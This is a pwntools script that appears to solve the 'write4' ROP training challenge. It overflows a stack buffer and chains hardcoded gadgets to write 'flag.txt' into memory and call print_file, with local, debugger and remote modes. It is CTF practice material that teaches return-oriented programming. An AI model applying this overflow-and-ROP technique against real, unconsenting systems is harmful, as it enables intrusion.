from pwn import *

elf = context.binary = ELF('./write4')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("", 10305)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b pwnme
    c
    nextret
    ''')
else:
    conn = elf.process()

#conn.send(cyclic(0x80))
POP_RDI = 0x400693
POP_R14_R15 = 0x400690
MOV_R14_R15 = 0x400628
payload = b'A'*40 + flat(POP_R14_R15, 0x602000-100,"flag.txt", MOV_R14_R15, POP_RDI, 0x602000-100,[elf.sym['print_file']])
conn.send(payload)

conn.interactive()